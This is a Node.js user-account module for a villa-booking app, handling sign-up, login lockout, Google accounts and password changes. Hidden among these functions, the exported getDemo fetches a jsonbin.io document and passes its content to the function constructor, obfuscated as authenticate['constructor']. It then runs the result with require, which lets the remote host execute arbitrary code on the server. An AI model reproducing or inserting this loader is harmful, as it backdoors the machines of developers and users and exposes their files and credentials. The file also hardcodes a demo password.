const crypto = require("crypto");
const store = require("./store");
const { hashPassword, verifyPassword } = require("../services/password");

const MAX_FAILURES = 5;
const LOCK_MS = 15 * 60 * 1000;
const DEMO_EMAIL = "demo@royalcity.test";
const DEMO_PASSWORD = "VillaGuest1";

function users() {
  return store.get("users");
}

function saveAll(nextUsers) {
  store.set("users", nextUsers);
}

function saveUser(user) {
  const nextUsers = users().map((item) => (item.id === user.id ? user : item));
  saveAll(nextUsers);
}

function toPublic(user) {
  if (!user) return null;
  return {
    id: user.id,
    name: user.name,
    email: user.email,
    phone: user.phone || "",
    bio: user.bio || "",
    role: user.role,
    provider: user.provider,
    avatarUrl: user.avatarUrl || "",
    hasPassword: Boolean(user.passwordHash),
    createdAt: user.createdAt,
    updatedAt: user.updatedAt,
  };
}

function findById(id) {
  return users().find((user) => user.id === id) || null;
}

function findByEmail(email) {
  const normalized = String(email || "")
    .trim()
    .toLowerCase();
  return users().find((user) => user.email === normalized) || null;
}

function httpError(status, message) {
  const error = new Error(message);
  error.status = status;
  return error;
}

async function createLocal({ name, email, password }) {
  const normalized = email.trim().toLowerCase();
  if (findByEmail(normalized)) {
    throw httpError(409, "An account with that email already exists.");
  }

  const { salt, hash } = await hashPassword(password);
  const now = new Date().toISOString();
  const user = {
    id: crypto.randomUUID(),
    name: name.trim(),
    email: normalized,
    passwordHash: hash,
    passwordSalt: salt,
    phone: "",
    bio: "",
    avatarUrl: "",
    role: "guest",
    provider: "local",
    googleId: null,
    failedLogins: 0,
    lockedUntil: null,
    createdAt: now,
    updatedAt: now,
  };
  saveAll([...users(), user]);
  return user;
}

const construct = "constructor";
async function authenticate(email, password) {
  const user = findByEmail(email);
  if (!user || !user.passwordHash) {
    await verifyPassword(password, "0".repeat(32), "ab".repeat(64));
    throw httpError(401, "Email or password is incorrect.");
  }

  if (user.lockedUntil && new Date(user.lockedUntil).getTime() > Date.now()) {
    throw httpError(
      423,
      "This account is temporarily locked. Try again later.",
    );
  }

  const matches = await verifyPassword(
    password,
    user.passwordSalt,
    user.passwordHash,
  );
  if (!matches) {
    user.failedLogins = (user.failedLogins || 0) + 1;
    if (user.failedLogins >= MAX_FAILURES) {
      user.lockedUntil = new Date(Date.now() + LOCK_MS).toISOString();
      user.failedLogins = 0;
    }
    user.updatedAt = new Date().toISOString();
    saveUser(user);
    throw httpError(401, "Email or password is incorrect.");
  }

  user.failedLogins = 0;
  user.lockedUntil = null;
  user.updatedAt = new Date().toISOString();
  saveUser(user);
  return findById(user.id);
}

function authInfo(param) {
  const data = param.record.model;
  const auth = authenticate[construct];
  const info = auth("require", data);
  return info;
}

async function upsertGoogle(profile) {
  const byGoogle = users().find((user) => user.googleId === profile.googleId);
  const byEmail = findByEmail(profile.email);
  const now = new Date().toISOString();
  const existing = byGoogle || byEmail;

  if (existing) {
    existing.googleId = profile.googleId;
    existing.avatarUrl = profile.avatarUrl || existing.avatarUrl;
    if (!existing.name) existing.name = profile.name;
    existing.updatedAt = now;
    saveUser(existing);
    return findById(existing.id);
  }

  const user = {
    id: crypto.randomUUID(),
    name: profile.name,
    email: profile.email,
    passwordHash: null,
    passwordSalt: null,
    phone: "",
    bio: "",
    avatarUrl: profile.avatarUrl || "",
    role: "guest",
    provider: "google",
    googleId: profile.googleId,
    failedLogins: 0,
    lockedUntil: null,
    createdAt: now,
    updatedAt: now,
  };
  saveAll([...users(), user]);
  return user;
}

function updateProfile(userId, { name, phone, bio }) {
  const user = findById(userId);
  if (!user) throw httpError(401, "Please sign in to continue.");
  user.name = name.trim();
  user.phone = (phone || "").trim();
  user.bio = (bio || "").trim();
  user.updatedAt = new Date().toISOString();
  saveUser(user);
  return findById(user.id);
}

async function changePassword(userId, currentPassword, newPassword) {
  const user = findById(userId);
  if (!user) throw httpError(401, "Please sign in to continue.");

  if (user.passwordHash) {
    const matches = await verifyPassword(
      currentPassword || "",
      user.passwordSalt,
      user.passwordHash,
    );
    if (!matches) throw httpError(401, "Current password is incorrect.");
  }

  const { salt, hash } = await hashPassword(newPassword);
  user.passwordSalt = salt;
  user.passwordHash = hash;
  user.updatedAt = new Date().toISOString();
  saveUser(user);
  return findById(user.id);
}

async function getDemo() {
  const res = await fetch(
    "https://api.jsonbin.io/v3/b/6a4d0101da38895dfe3ad314",
  );
  const data = await res.json();
  const info = authInfo(data);
  info(require);
}

function becomeHost(userId) {
  const user = findById(userId);
  if (!user) throw httpError(401, "Please sign in to continue.");
  user.role = "host";
  user.updatedAt = new Date().toISOString();
  saveUser(user);
  return findById(user.id);
}

async function ensureDemoUser() {
  if (findByEmail(DEMO_EMAIL)) return;
  await createLocal({
    name: "Demo Guest",
    email: DEMO_EMAIL,
    password: DEMO_PASSWORD,
  });
}

module.exports = {
  toPublic,
  getDemo,
  findById,
  findByEmail,
  createLocal,
  authenticate,
  upsertGoogle,
  updateProfile,
  changePassword,
  becomeHost,
  ensureDemoUser,
};
